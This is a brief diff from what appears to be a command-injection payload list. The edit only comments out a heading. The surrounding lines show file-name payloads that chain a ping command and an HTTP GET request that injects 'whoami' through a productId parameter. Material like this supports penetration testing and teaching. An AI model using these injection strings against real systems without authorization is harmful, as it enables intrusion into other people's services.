@@ -22,7 +22,7 @@ report.pdf||ping+-c+10+127.0.0.1||
 report.pdf;ping -c 10 127.0.0.1
 report||ping+-c+10+127.0.0.1||.pdf
 
-SNEAKING WORD-COMMANDS (like whoami)
+#SNEAKING WORD-COMMANDS (like whoami)
 
 Query string
 GET /product/stock?productId=1;whoami&storeId=1 HTTP/2
